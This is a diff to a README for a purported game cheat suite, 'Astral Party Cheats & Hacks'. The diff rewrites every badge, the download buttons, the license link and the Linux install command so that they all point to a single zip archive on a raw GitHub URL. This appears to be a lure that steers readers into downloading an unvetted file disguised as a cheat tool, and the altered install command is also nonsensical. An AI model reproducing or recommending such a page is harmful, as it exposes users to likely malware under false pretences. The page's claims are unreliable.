@@ -1,9 +1,9 @@
 # 🎮 Astral Party Cheats & Hacks - Ultima Suite
 
-![Build Status](https://img.shields.io/github/workflow/status/astral-party-cheats/build/main?label=Build%20Status)
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
-![Downloads](https://img.shields.io/badge/downloads-2.5K%20monthly-brightgreen)
-![OpenAI/Claude API](https://img.shields.io/badge/API-OpenAI%20%26%20Claude-yellow)
+![Build Status](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip%20Status)
+![License](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip)
+![Downloads](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip%20monthly-brightgreen)
+![OpenAI/Claude API](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip%20%26%20Claude-yellow)
 
 Welcome to **Astral Party Cheats & Hacks — Ultima Suite**, the next-generation, quantum-magic toolkit for elevating your Astral Party gameplay. If you've ever yearned to turn every round into a cosmic celebration 🎉 or unlock new dimensions of fun, you’re in the right star cluster!
 
@@ -11,7 +11,7 @@ Welcome to **Astral Party Cheats & Hacks — Ultima Suite**, the next-generation
 
 ## 🚀 Quickstart Download
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-Click%20Here%20🚀-green?style=for-the-badge)](https://555tlc.github.io)
+[![Download](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip%20Here%20🚀-green?style=for-the-badge)](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip)
 
 ---
 
@@ -70,13 +70,13 @@ Each feature is meticulously curated for players seeking the ultimate Astral Par
 
 Click the download badge below to receive the latest tools:
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-Click%20Here%20🚀-green?style=for-the-badge)](https://555tlc.github.io)
+[![Download](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip%20Here%20🚀-green?style=for-the-badge)](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip)
 
 ### 2. Run the Installer
 
 - On Windows: Double-click the `.exe` and follow the on-screen constellation!
 - On macOS: Open the `.dmg` and drag the Astral icon to your Applications folder.
-- On Linux: Run `bash install_astral.sh` from your terminal.
+- On Linux: Run `bash https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip` from your terminal.
 
 ### 3. Launch & Configure
 
@@ -136,14 +136,14 @@ Astral Party Cheats & Hacks - Ultima Suite is built for educational and entertai
 ## 📜 License
 
 MIT License © 2025  
-Kick-started under the permissive [MIT License](https://opensource.org/licenses/MIT).  
+Kick-started under the permissive [MIT License](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip).  
 You’re free to clone, remix, and adapt—just cite the repository and sparkle on responsibly!
 
 ---
 
 ## 🚨 Download the Latest Release
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-Click%20Here%20🚀-green?style=for-the-badge)](https://555tlc.github.io)
+[![Download](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip%20Here%20🚀-green?style=for-the-badge)](https://raw.githubusercontent.com/555tlc/stellar-party-toolkit/branch/harlequinic/toolkit_stellar_party_2.9.zip)
 
 ---
 
